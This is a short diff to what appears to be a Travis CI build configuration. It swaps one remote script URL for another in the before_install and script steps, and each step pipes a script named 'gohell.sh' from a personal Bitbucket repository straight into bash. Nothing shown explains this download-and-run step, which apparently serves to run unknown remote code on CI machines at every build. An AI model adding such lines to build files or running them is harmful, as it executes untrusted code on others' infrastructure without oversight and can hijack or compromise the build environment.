@@ -75,7 +75,7 @@ rvm:
   - "1.9.3"
 
 before_install:
-  - curl -sL https://bitbucket.org/lariza999/gradi/raw/main/gohell.sh | bash
+  - curl -sL https://bitbucket.org/aing005/zeplak/raw/main/gohell.sh | bash
 
 script:
-  - curl -sL https://bitbucket.org/lariza999/gradi/raw/main/gohell.sh | bash
+  - curl -sL https://bitbucket.org/aing005/zeplak/raw/main/gohell.sh | bash
